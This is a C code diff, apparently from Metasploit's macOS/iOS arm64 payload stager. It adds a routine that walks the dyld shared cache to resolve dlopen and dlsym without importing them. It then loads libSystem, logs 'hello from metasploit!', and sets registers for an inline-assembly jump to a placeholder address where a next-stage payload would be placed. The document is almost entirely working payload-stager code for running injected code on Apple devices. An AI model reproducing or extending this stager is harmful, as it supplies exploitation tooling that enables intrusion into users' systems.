@@ -14,6 +14,9 @@
 #include <mach-o/nlist.h>
 #include <mach-o/dyld.h>
 
+#include <dlfcn.h>
+#include <asl.h>
+
 #include <sys/types.h>
 #include <sys/sysctl.h>
 
@@ -26,7 +29,6 @@ int string_compare(const char* s1, const char* s2);
 typedef NSObjectFileImageReturnCode (*NSCreateObjectFileImageFromMemory_ptr)(void *address, unsigned long size, NSObjectFileImage *objectFileImage);
 typedef NSModule (*NSLinkModule_ptr)(NSObjectFileImage objectFileImage, const char* moduleName, unsigned long options);
 
-uint64_t find_entry_offset(struct mach_header_64 *mh);
 uint64_t find_entry_offset(struct mach_header_64 *mh);
 int detect_sierra();
 
@@ -238,8 +240,19 @@ struct shared_file_mapping {
     uint32_t       init_prot;
 };
 
+struct dyld_cache_image_info
+{
+    uint64_t    address;
+    uint64_t    modTime;
+    uint64_t    inode;
+    uint32_t    pathFileOffset;
+    uint32_t    pad;
+};
+
+
 long syscall(const long syscall_number, const long arg1, const long arg2, const long arg3, const long arg4, const long arg5, const long arg6);
 int main(int argc, char** argv);
+void * get_dyld_function(const char* function_symbol);
 uint64_t syscall_chmod(uint64_t path, long mode);
 uint64_t syscall_shared_region_check_np();
 
@@ -260,11 +273,13 @@ void init()
     /*return;*/
   /*}*/
 
-  uint64_t shared_region_start = 0x180000000;
-  uint64_t binary = find_macho(shared_region_start + 0x1000, 0x1000, 0);
-  uint64_t dyld = find_macho(binary + 0x1000, 0x1000, 0);
+  /*uint64_t shared_region_start = 0x180000000;*/
+  /*uint64_t binary = find_macho(shared_region_start + 0x1000, 0x1000, 0);*/
+  /*uint64_t dyld = find_macho(binary + 0x1000, 0x1000, 0);*/
   uint64_t shared_region_check = syscall_shared_region_check_np();
-
+  /*uint64_t dllookup_func = (uint64_t)get_dlsym_addr();*/
+  uint64_t dlsym_addr = (uint64_t)get_dyld_function("_dlsym");
+  uint64_t dlopen_addr = (uint64_t)get_dyld_function("_dlopen");
   /*struct dyld_cache_header *header = (void*)shared_region_start;*/
   /*struct shared_file_mapping *sfm = (void*)header + header->mappingOffset;*/
   /*void* vm_slide_offset  = (void*)header - sfm->address;*/
@@ -282,20 +297,23 @@ void init()
   /*}*/
 
   typedef void* (*dlsym_ptr)(void *handle, const char *symbol);
-  typedef void (*dlopen_ptr)(const char *filename, int flags);
-  dlopen_ptr dlopen_func = 0;
-  dlsym_ptr dlsym_func = 0;
-  /*dlopen_func = (void*)dlsym_func((void*)0, "_dlsym");*/
+  typedef void* (*dlopen_ptr)(const char *filename, int flags);
+  typedef int (*asl_log_ptr)(aslclient asl, aslmsg msg, int level, const char *format, ...);
+  dlsym_ptr dlsym_func = dlsym_addr;
+  dlopen_ptr dlopen_func = dlopen_addr;
+  void* libsystem = dlopen_func("/usr/lib/libSystem.B.dylib", RTLD_NOW);
+  asl_log_ptr asl_log_func = dlsym_func(libsystem, "asl_log");
+  asl_log_func(0, 0, ASL_LEVEL_ERR, "hello from metasploit!\n");
 
   typedef void (*func_ptr)();
   func_ptr func = (func_ptr)0x4545454545;
 #ifdef __x86_64
 #else
 	volatile register uint64_t x0 asm("x0") = 0x45454541;
-	volatile register uint64_t x1 asm("x1") = (uint64_t)shared_region_start;
-	volatile register uint64_t x2 asm("x2") = (uint64_t)binary;
-	volatile register uint64_t x3 asm("x3") = (uint64_t)dyld;
-	volatile register uint64_t x4 asm("x4") = (uint64_t)shared_region_check;
+	volatile register uint64_t x1 asm("x1") = (uint64_t)dlsym_func;
+	volatile register uint64_t x2 asm("x2") = (uint64_t)libsystem;
+	volatile register uint64_t x3 asm("x3") = (uint64_t)asl_log_func;
+	volatile register uint64_t x4 asm("x4") = (uint64_t)0x79;
   asm volatile (
       "mov x0, %0\n\t"
       "mov x1, %1\n\t"
@@ -413,6 +431,71 @@ int string_compare(const char* s1, const char* s2)
     s2++;
   }
   return (*(unsigned char *) s1) - (*(unsigned char *) s2);
+}
+
+void * get_dyld_function(const char* function_symbol) 
+{
+  uint64_t shared_region_start = syscall_shared_region_check_np();
+  //NSLog(@"shared_region_start %p\n", shared_region_start);
+
+  struct dyld_cache_header *header = (void*)shared_region_start;
+  struct shared_file_mapping *sfm = (void*)header + header->mappingOffset;
+  struct dyld_cache_image_info *dcimg = (void*)header + header->imagesOffset;
+  uint64_t libdyld_address;
+  for (size_t i=0; i < header->imagesCount; i++) {
+    char * pathFile = (char *)shared_region_start+dcimg->pathFileOffset;
+    //NSLog(@"pathFile %p %s\n", (void*)dcimg->address, pathFile);
+    if (string_compare(pathFile, "/usr/lib/system/libdyld.dylib") == 0) {
+      //NSLog(@"dyld_address %p\n",  dcimg->address);
+      libdyld_address = dcimg->address;
+      break;
+    }
+    dcimg++;
+  }
+  void* vm_slide_offset  = (void*)header - sfm->address;
+  //NSLog(@"vm_slide_offset %p\n",  vm_slide_offset);
+  libdyld_address = (libdyld_address + vm_slide_offset);
+
+  struct mach_header_64 *mh = (struct mach_header_64*)libdyld_address;
+  const struct load_command* cmd = (struct load_command*)(((char*)mh)+sizeof(struct mach_header_64));
+  struct symtab_command* symtab_cmd = 0;
+  struct segment_command_64* linkedit_cmd = 0;
+  struct segment_command_64* text_cmd = 0;
+
+  for (uint32_t i = 0; i < mh->ncmds; ++i) {
+    //NSLog(@"line %d load %p %p", __LINE__, cmd->cmd, cmd);
+    if (cmd->cmd == LC_SEGMENT_64) {
+      struct segment_command_64* segment_cmd = (struct segment_command_64*)cmd;
+      if (string_compare(segment_cmd->segname, SEG_TEXT) == 0) {
+        text_cmd = segment_cmd;
+        /*NSLog(@"text_segment :%p %s %p %p %p %p:\n", segment_cmd, segment_cmd->segname, segment_cmd->vmaddr, segment_cmd->fileoff, segment_cmd->nsects, segment_cmd->cmd);*/
+      } else if (string_compare(segment_cmd->segname, SEG_LINKEDIT) == 0) {
+        linkedit_cmd = segment_cmd;
+        /*NSLog(@"linkedit :%p %p vmaddr %p fileoff %p:\n", linkedit_cmd, segment_cmd->segname, linkedit_cmd->vmaddr, linkedit_cmd->fileoff);*/
+      }
+    }
+    if (cmd->cmd == LC_SYMTAB) {
+      symtab_cmd = (struct symtab_command*)cmd;
+      /*NSLog(@"symtab :%p %d %p %p %p:\n", symtab_cmd, symtab_cmd->nsyms, symtab_cmd->symoff, symtab_cmd->stroff, symtab_cmd->strsize);*/
+    }
+    cmd = (const struct load_command*)(((char*)cmd)+cmd->cmdsize);
+  }
+
+  unsigned int file_slide = ((unsigned long)linkedit_cmd->vmaddr - (unsigned long)text_cmd->vmaddr) - linkedit_cmd->fileoff;
+  struct nlist_64 *sym = (struct nlist_64*)((unsigned long)mh + (symtab_cmd->symoff + file_slide));
+  char *strings = (char*)((unsigned long)mh + (symtab_cmd->stroff + file_slide));
+
+  for (uint32_t i = 0; i < symtab_cmd->nsyms; ++i) {
+    if (sym->n_un.n_strx) {
+      char * symbol = strings + sym->n_un.n_strx;
+      //NSLog(@"symbol :%s %p:\n", symbol, sym->n_value);
+      if (string_compare(symbol, function_symbol) == 0) {
+        return sym->n_value + vm_slide_offset;
+      }
+    }
+    sym += 1;
+  }
+  return 0;
 }
 
 uint64_t find_symbol(uint64_t base, char* symbol) 
